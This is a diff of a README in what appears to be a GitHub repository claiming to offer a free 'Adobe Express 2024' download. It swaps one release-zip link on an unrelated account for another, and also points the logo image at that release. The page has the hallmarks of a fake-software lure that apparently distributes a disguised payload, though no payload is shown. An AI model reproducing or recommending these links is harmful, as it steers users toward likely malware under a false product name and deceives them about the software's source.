@@ -11,7 +11,7 @@ This repository is dedicated to providing the latest version of Adobe Express, c
 
 ## Download Adobe Express 2024
 To download Adobe Express 2024, click the button below:
-[![Download Adobe Express](https://img.shields.io/badge/Download-Adobe_Express-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Adobe Express](https://github.com/Github1828828/Adobe-Express-2024/releases/tag/v2.0)](https://github.com/Github1828828/Adobe-Express-2024/releases/tag/v2.0)
 
 ## Need Help?
 If you encounter any issues with the download link provided above or if it needs to be launched, please check the "Releases" section of this repository for alternative download options.
@@ -21,4 +21,4 @@ Start exploring the exciting features of Adobe Express 2024 now! Download it for
 
 Happy creating! 🚀
 
-![Adobe Express Logo](https://www.example.com/adobe-express-logo.jpg)
+![Adobe Express Logo](https://github.com/Github1828828/Adobe-Express-2024/releases/tag/v2.0)
